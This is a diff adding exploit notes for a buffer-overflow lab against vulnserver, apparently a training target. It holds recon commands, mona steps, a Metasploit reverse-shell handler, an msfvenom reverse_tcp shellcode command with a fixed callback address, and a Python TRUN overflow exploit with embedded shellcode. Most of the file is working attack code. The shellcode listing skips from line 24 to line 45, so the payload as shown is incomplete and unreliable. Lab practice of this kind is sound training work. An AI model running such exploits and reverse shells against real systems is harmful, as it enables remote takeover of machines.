@@ -1,0 +1,64 @@
+#static
+strings ./vulnserver.exe | select -First 
+
+#behavior
+get-process | findstr /i vuln
+netstat -anop tcp | findstr 9672
+
+#dynamic 
+run immunity as administrator > open .exe > play, rewind, repeat
+Fuzzing > WireMask > find ofset 
+
+!mona modules #find unprotected DLLs
+!mona jmp -r esp -m "essfunc.dll" #search for JMP ESP with unprotected DLL
+#Window > log data
+
+# MSF Console 
+msfconsole
+use multi/handler
+show options
+set payload windows\meterpreter\reverse_tcp
+set LHOST 0.0.0.0
+set LPORT 4444
+exploit
+
+# shell code
+ msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.152.249 lport=4444 -b "\x00\xfe\x20\x0a\ff" -f python
+
+#!/usr/bin/python
+  2 import socket
+  3 
+  4 #1: buf = "HELP"
+  5 buf = "TRUN /.:/"
+  6 # 2: buf += "A" * 5000
+  7 # 3: buf += "wiremask output 5000"
+  8 buf += "A" *2003 #offset
+  9 #4: buf += "VOVO" 
+ 10 buf += "\xaf\x11\x50\x62" #JMP ESP in EIP
+ 11 buf += "\x90" * 10 #NOP Sled
+ 12 
+ 13 ##SHELL CODE###
+ 14 buf += b"\xbd\x15\x1f\xc2\x1b\xdb\xd8\xd9\x74\x24\xf4\x5b"
+ 15 buf += b"\x29\xc9\xb1\x59\x31\x6b\x14\x03\x6b\x14\x83\xc3"
+ 16 buf += b"\x04\xf7\xea\x3e\xf3\x78\x14\xbf\x04\xe6\x9c\x5a"
+ 17 buf += b"\x35\x34\xfa\x2f\x64\x88\x88\x62\x85\x63\xdc\x96"
+ 18 buf += b"\x9a\xc4\xab\xb0\x95\xd5\xa7\xcf\xfd\x18\x78\x83"
+ 19 buf += b"\xc2\x3b\x04\xde\x16\x9b\x35\x11\x6b\xda\x72\xe7"
+ 20 buf += b"\x01\x33\x2e\x73\xbb\xdb\x98\x08\x7e\xe7\x27\xdf"
+ 21 buf += b"\xf4\x57\x50\x5a\xca\x23\xec\x65\x1b\x9b\x67\x3d"
+ 22 buf += b"\xbb\x1a\xab\x35\xf3\x04\xce\x83\x70\x08\x99\x22"
+ 23 buf += b"\x86\xfb\x2d\xce\x79\x2d\x7c\x10\xd5\x10\xb0\x9d"
+ 24 buf += b"\x27\x55\x77\x7e\x52\xad\x8b\x03\x65\x76\xf1\xdf"
+ 45 buf += b"\xdf\x3f\x92\xe4\x4a\x3f\x80\xf7\x5e"
+ 46 
+ 47 s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) #create the IPV4 soc    ket,tcp protocol
+ 48 s.connect(("10.50.152.250", 9999)) #connect to target IP and PORT
+ 49 print s.recv(1024) #print response 
+ 50 s.send(buf) #send the value of buf
+ 51 print s.recv(1024) #print response
+ 52 s.close() #close the socket 
+ 53 '''
+ 54 62|50|11|AF -> "\xaf\x11\x50\x62" 
+ 55 62|50|11|BB -> "\xbb\x11\x50\x62"
+ 56 62|50|11|C7 -> "\xc7\x11\x50\x62"
+ 57 '''
